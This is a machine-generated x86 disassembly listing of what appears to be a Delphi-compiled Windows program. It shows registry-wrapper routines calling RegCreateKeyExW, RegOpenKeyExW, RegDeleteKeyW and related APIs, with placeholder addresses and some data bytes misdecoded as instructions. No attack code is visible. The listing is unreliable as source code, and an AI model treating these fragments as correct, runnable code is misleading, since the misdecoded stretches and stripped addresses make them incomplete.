mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_409cf8
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_44223c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0xc ]
test esi esi
je r-xdata
mov eax edi
dec ax
je r-xdata
lea eax [ ebx + 0x20 ]
mov edx esi
call sub_4070a8
mov ecx esi
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_441d90
jmp r-xdata
dec ax
je r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_44195c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_44203c
jmp r-xdata
sub ax 0x5
je r-xdata
mov ecx esi
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_441d90
jmp r-xdata
jmp r-xdata
push edi
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44198c
sub_4423ed
add [ eax ] al
add [ ecx ] cl
pop [ ecx + 0x69 ]
dec ecx
pop esi
cdq
dec eax
sahf
adc ebx [ edi + 0x7549c1e3 ]
push bp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_442541
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4424da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_4070a8
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4418ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424e1
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4305a0
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x4 ]
call sub_418a80
test al al
je r-xdata
sub_442400
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
mov ebx ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_442541
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4424da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x20
mov edx ebx
call sub_4070a8
lea ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_4418ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4424e1
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x18 ]
mov ecx ebx
mov eax [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4305a0
mov ebx eax
lea eax [ ebp - 0x4 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebx + 0x4 ]
call sub_418a80
test al al
je r-xdata
sub_4424e1
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_409cf8
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442548
lea eax [ ebp - 0x1c ]
call sub_409cb4
lea eax [ ebp - 0x18 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_442641
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov ecx r-xdata
call sub_409cf8
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4426a8
lea eax [ ebp - 0x1c ]
call sub_409cb4
lea eax [ ebp - 0x18 ]
call j_sub_4068a0
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
sub_4427be
inc esi
fstp [ edx - 0x76b955aa ]
in eax 0x8a
lodsb [ esi ]
cmpsd [ esi ] [ edi ]
xor [ fs : ebx + 0x55 ] cl
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov esi eax
xor eax eax
push ebp
push sub_44289d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
xor edx edx
call sub_4070a8
mov eax [ esi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4428a4
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc eax
xor ebx ebx
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
jmp r-xdata
mov eax [ esi + 0x14 ]
mov edx ebx
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
sub_4428b3
dec edx
xchg ecx eax
test al 0x4b
xchg ebp eax
xchg [ ebx - 0x74aa8758 ] edi
in al dx
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0xc ] edx
mov edi eax
xor eax eax
push ebp
push sub_44297f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ edi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442986
lea eax [ ebp - 0x8 ]
call sub_409cb4
lea eax [ ebp - 0x4 ]
call sub_409cb4
retn
inc ebx
xor esi esi
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx esi
call sub_4305a0
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
call sub_409ccc
lea eax [ ebp - 0x8 ]
call sub_409cb4
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_418a80
test al al
je r-xdata
inc esi
dec ebx
jne r-xdata
sub_4429b8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4305a0
cmp ebp [ eax + 0x8 ]
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4305a0
mov edi eax
cmp ebp [ edi + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_430438
jmp r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_430438
mov eax edi
call sub_4055f0
jmp r-xdata
sub_442a28
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_442a59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442a60
retn
mov eax rw-data
call sub_409cb4
sub_442a80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_442b62
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
movzx eax bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442b69
lea eax [ ebp - 0x8 ]
call sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ecx 0x0
call sub_4072d4
mov eax [ ebp - 0x8 ]
call sub_406c0c
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
movzx eax bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_442a80
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4070fc
sub_442c3c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_442a80
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_44359c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44362b
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443632
retn
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
mov edx [ r-xdata ]
call sub_408928
mov eax rw-data
mov edx [ r-xdata ]
call sub_408928
mov eax rw-data
mov edx [ r-xdata ]
call sub_408928
mov eax rw-data
mov edx [ r-xdata ]
call sub_408928
sub_44365b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4436aa
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4436b1
retn
mov eax rw-data
call j_sub_4068a0
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_407e40
sub_444864
push ebx
add esp 0xfffffff8
mov ebx eax
mov [ esp ] ebx
mov [ esp + 0x4 ] 0x11
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
pop ecx
pop edx
pop ebx
retn
sub_444890
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4448f7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ eax ] 0x5c
sete al
jmp r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
xor bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4448fe
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
sub_444904
dec al
je r-xdata
mov eax 0x1
retn
dec al
je r-xdata
mov eax 0x2
retn
dec al
je r-xdata
mov eax 0x4
retn
dec al
je r-xdata
mov eax 0x3
retn
jmp r-xdata
xor eax eax
retn
sub_444934
cmp eax 0x1
jne r-xdata
cmp eax 0x2
jne r-xdata
mov al 0x1
retn
cmp eax 0x4
jne r-xdata
mov al 0x2
jmp r-xdata
cmp eax 0x3
jne r-xdata
mov al 0x3
jmp r-xdata
retn
xor eax eax
mov al 0x4
jmp r-xdata
sub_44495c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov edi eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_444a99
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + edx * 2 ]
add edx esi
dec edx
mov eax ebx
call sub_40740c
mov eax [ ebx ]
call sub_407134
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
dec eax
test eax eax
jl r-xdata
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4070a8
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444aa0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
inc eax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x14 ] 0x0
mov ebx edi
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx [ ebp - 0x18 ]
movzx eax [ eax ]
mov [ edx + esi * 2 ] ax
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
add esi eax
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edx [ ebp - 0x18 ]
movzx eax [ eax + 0x2 ]
mov [ edx + esi * 2 + 0x2 ] ax
mov eax [ ebp - 0x10 ]
dec eax
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
add esi 0x3
inc [ ebp - 0x14 ]
inc ebx
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp - 0x18 ]
mov [ eax + esi * 2 + 0x4 ] 0x2c
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
lea ecx [ ebp - 0x8 ]
movzx eax [ ebx ]
mov edx 0x2
call sub_411b48
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub_444aac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx 0x80000001
mov eax esi
call sub_444b94
mov [ esi + 0x18 ] 0xf003f
mov [ esi + 0xc ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax esi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_444af0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_444aac
mov [ edi + 0x18 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_405b0c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_405b64
pop [ fs : 0x0 ]
add esp 0xc
sub_444b2c
push ebx
push esi
call sub_405bb4
mov ebx edx
mov esi eax
mov eax esi
call sub_444b64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4055e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_405b5c
sub_444b64
push ebx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop ebx
retn
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
push eax
call RegCloseKey
xor eax eax
mov [ ebx + 0x4 ] eax
lea eax [ ebx + 0x10 ]
xor edx edx
call sub_4070a8
push eax
call RegFlushKey
sub_444b94
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov [ ebx + 0x8 ] esi
mov eax ebx
call sub_444b64
push eax
call RegCloseKey
mov [ ebx + 0x14 ] 0x0
sub_444bc0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_444b64
mov [ ebx + 0x4 ] esi
lea eax [ ebx + 0x10 ]
mov edx edi
call sub_4070a8
pop edi
pop esi
pop ebx
retn
sub_444bfc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_444ccc
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_4070fc
mov eax [ ebp - 0x4 ]
call sub_444890
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov edx ebx
mov eax esi
call sub_444be4
push eax
call RegCreateKeyExW
mov edx eax
mov eax esi
call sub_444b58
mov ebx eax
test bl bl
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4078a0
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] 0x11
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
mov eax [ ebp - 0x8 ]
push eax
call RegCloseKey
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444cd3
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_444cdc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x5 ] cl
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_444ded
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4070fc
mov eax [ ebp - 0x4 ]
call sub_444890
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4078a0
lea eax [ ebp - 0xc ]
push eax
mov eax [ esi + 0x18 ]
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov edx ebx
mov eax esi
call sub_444be4
push eax
call RegOpenKeyExW
mov edx eax
mov eax esi
call sub_444b58
mov [ ebp - 0x6 ] al
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x6 ] 0x0
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov eax [ esi + 0x18 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov edx ebx
mov eax esi
call sub_444be4
push eax
call RegCreateKeyExW
mov edx eax
mov eax esi
call sub_444b58
mov [ ebp - 0x6 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444df4
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_444bc0
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_407648
sub_444e10
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_444fd3
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4070fc
mov eax [ ebp - 0x4 ]
call sub_444890
mov ebx eax
test bl bl
jne r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov edi [ esi + 0x18 ]
and edi 0x300
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x20019
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov edx ebx
mov eax esi
call sub_444be4
push eax
call RegOpenKeyExW
mov edx eax
mov eax esi
call sub_444b58
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4078a0
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x20009
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov edx ebx
mov eax esi
call sub_444be4
push eax
call RegOpenKeyExW
mov edx eax
mov eax esi
call sub_444b58
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
or edi 0x20019
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov eax edi
or eax 0x1
push eax
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov edx ebx
mov eax esi
call sub_444be4
push eax
call RegOpenKeyExW
mov edx eax
mov eax esi
call sub_444b58
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
or edi 0x20009
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_444bc0
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_407648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444fda
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
or edi 0x1
mov [ esi + 0x18 ] edi
cmp [ esi + 0x4 ] 0x0
setne al
test al bl
je r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_444bc0
jmp r-xdata
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_407648
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov eax esi
call sub_444bc0
push [ esi + 0x10 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_407648
sub_444ff8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
xor ecx ecx
mov [ ebp - 0x3c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445173
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4070fc
mov eax [ ebp - 0x4 ]
call sub_444890
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] eax
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_445ca4
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4078a0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
movzx edx [ ebp - 0x11 ]
mov eax [ ebp - 0xc ]
call sub_444be4
push eax
call RegDeleteKeyW
mov edx eax
mov eax [ ebp - 0xc ]
call sub_444b58
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44517a
lea eax [ ebp - 0x3c ]
call j_sub_4068a0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
xor eax eax
push ebp
push sub_445122
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_444bf8
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0xc ]
call sub_4451a8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_444bf8
mov eax [ ebp - 0x1c ]
push eax
call RegCloseKey
retn
mov ecx [ ebp - 0x34 ]
inc ecx
lea eax [ ebp - 0x8 ]
xor edx edx
call sub_4071e4
mov ebx [ ebp - 0x38 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x34 ]
inc eax
mov [ ebp - 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_407134
push eax
push ebx
mov eax [ ebp - 0x1c ]
push eax
call RegEnumKeyExW
mov edx eax
mov eax [ ebp - 0xc ]
call sub_444b58
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_407134
mov edx eax
lea eax [ ebp - 0x3c ]
call sub_407254
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0xc ]
call sub_444ff8
sub_445184
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_407134
push eax
mov eax [ ebx + 0x4 ]
push eax
call RegDeleteValueW
mov edx eax
